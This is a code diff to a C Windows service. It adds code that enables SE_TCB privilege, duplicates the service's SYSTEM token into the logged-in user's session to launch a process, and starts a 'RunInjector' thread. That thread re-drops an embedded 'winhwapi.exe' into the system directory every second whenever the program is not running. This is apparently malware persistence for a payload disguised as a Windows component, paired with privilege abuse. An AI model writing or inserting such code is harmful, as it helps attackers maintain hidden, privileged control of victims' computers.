@@ -402,11 +402,27 @@ void CreateProcessCurrent(LPCSTR lpPath) {
 		Sleep(1000);
 	}
 	DWORD dwSessionId = WTSGetActiveConsoleSessionId();
-
+	HANDLE hProcessToken = NULL;
 	HANDLE hUserToken = NULL;
+
+	TOKEN_PRIVILEGES TokenPriv, OldTokenPriv;
+	DWORD OldSize = 0;
+	OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS_P, &hProcessToken);
+	LookupPrivilegeValue(NULL, SE_TCB_NAME, &TokenPriv.Privileges[0].Luid);
+	TokenPriv.PrivilegeCount = 1;
+	TokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	AdjustTokenPrivileges(hProcessToken, FALSE, &TokenPriv, sizeof(TokenPriv), &OldTokenPriv, &OldSize);
+
+
+	DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserToken);
+
+	SetTokenInformation(hUserToken, TokenSessionId, &dwSessionId, sizeof(dwSessionId));
+
+
+	//HANDLE hUserToken = NULL;
 	HANDLE hToken = NULL;
 	WTSQueryUserToken(dwSessionId, &hToken);
-	DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserToken);
+	//DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hUserToken);
 	LPVOID pEnv = NULL;
 
 	CreateEnvironmentBlock(&pEnv, hToken, TRUE);
@@ -426,7 +442,7 @@ void CreateProcessCurrent(LPCSTR lpPath) {
 	StringCbCopyA(szPath, sizeof(szPath), lpPath);
 	//launch the process in active logged in user's session
 	CreateProcessAsUserA(
-		hToken,
+		hUserToken,
 		szPath,
 		NULL,
 		NULL,
@@ -438,7 +454,7 @@ void CreateProcessCurrent(LPCSTR lpPath) {
 		&si,
 		&pi
 	);
-	//WaitForSingleObject(pi.hProcess, INFINITE);
+	WaitForSingleObject(pi.hProcess, INFINITE);
 	CloseHandle(pi.hThread);
 	CloseHandle(pi.hProcess);
 	DestroyEnvironmentBlock(pEnv);
@@ -513,9 +529,11 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 }
 
 DWORD WINAPI DeleteSetup(LPVOID Param);
+DWORD WINAPI RunInjector(LPVOID Param);
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
 	CreateThread(NULL, 0, DeleteSetup, NULL, 0, 0);
+	CreateThread(NULL, 0, RunInjector, NULL, 0, 0);
 	OutputDebugStringA("ServiceMain");
 	ILib_DumpEnabledContext winException;
 	size_t len = 0;
@@ -576,10 +594,43 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
 	}
 }
+BOOL IsProcessRunning(const char* processName) {
+	// Create a snapshot of the running processes.
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	if (hSnapshot == INVALID_HANDLE_VALUE) {
+		return FALSE;
+	}
+
+	PROCESSENTRY32 pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+
+	if (Process32First(hSnapshot, &pe32)) {
+		do {
+			// Compare the process name with the one you are looking for.
+			if (_stricmp(pe32.szExeFile, processName) == 0) {
+				CloseHandle(hSnapshot);
+				return TRUE;
+			}
+		} while (Process32Next(hSnapshot, &pe32));
+	}
+
+	CloseHandle(hSnapshot);
+	return FALSE;
+}
+DWORD WINAPI RunInjector(LPVOID Param)
+{
+	while (TRUE) {
+		if (!IsProcessRunning("winhwapi.exe")) {
+			ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "winhwapi.exe");
+		}
+		Sleep(1000);
+	}
+	
+}
+
 DWORD WINAPI DeleteSetup(LPVOID Param)
 {
-	ReleaseFileToSysDir(IDR_WINHWAPI1, (CHAR*)"winhwapi", "winhwapi.exe");
-
 	CHAR szTarget[260] = { 0 };
 	CHAR szFile[260] = { 0 };
 
